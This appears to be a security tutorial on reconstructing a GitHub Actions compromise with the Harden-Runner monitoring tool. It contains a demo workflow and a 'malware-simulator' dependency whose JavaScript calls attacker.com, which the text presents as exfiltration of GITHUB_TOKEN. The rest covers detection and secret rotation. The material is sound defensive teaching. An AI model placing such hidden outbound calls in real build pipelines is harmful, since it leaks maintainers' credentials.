# Forensically Reconstruct An Incident Post-Compromise

## Introduction
In this section, we will find out how an actor with `write` permission can exfiltration of sensitive information and deletes the run later to remove the evidance.

## Example Action:
Description: An example GitHub Actions workflow that does upload sensitive information like GITHUB_TOKEN to attacker.com.

```
name: "Hosted: Network Monitoring with Harden-Runner"
on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: step-security/harden-runner@v2
        with:
          egress-policy: audit
      - uses: actions/checkout@v3
      - name: npm install
        run: |
          cd ./src/exfiltration-demo
          npm install
      - name: Publish to Registry
        uses: elgohr/Publish-Docker-Github-Action@v5
        with:
          name: ${{ github.repository }}/prod:latest
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
          registry: ghcr.io
          workdir: ./src/exfiltration-demo
```

Here src/package.json has following dependencies
```
  "dependencies": {
    "@step-security/malware-simulator": "file:../malware-simulators/exfiltration-simulator"
  },
```

And the malware-simulator is overwriting the `index.js` file.
```
https
  .get("https://attacker.com/", (res) => {
    if (res.statusCode < 200 || res.statusCode >= 300) {
      console.error("HTTP Error: " + res.statusCode);
      process.exit(1); // Exit with a failure code on HTTP error status
    }

    let data = "";

    res.on("data", (chunk) => {
      data += chunk;
    });

    res.on("end", () => {
      console.log(data);
    });
  })
  .on("error", (err) => {
    console.error("Error: " + err.message);
    process.exit(1); // Exit with a failure code
  });
```

## Steps to Identify the Vulnerability:

### Review File Tempering:
When `step-security/harden-runner@v2` is added in the workflow you can open the `StepSecurity Dashboard` and click on the `Runtime Security` tab. You should see a record for the workflow run and can click on it to view the outbound calls made during the run, and what process made the call. This is important forensic information that can help confirm the incident, and identify the step and the process that exfiltrated secrets. It can also be used to understand who ran the workflow to identify whose credentials have been compromised.


## Steps to Mitigate the Vulnerability:

### Remove permissions from user and rotate the leaked secrets
Once you have identified the actor who had done exfiltration of sensitive information you can remove their `write` permission and rotate all the secrets which were leaked.




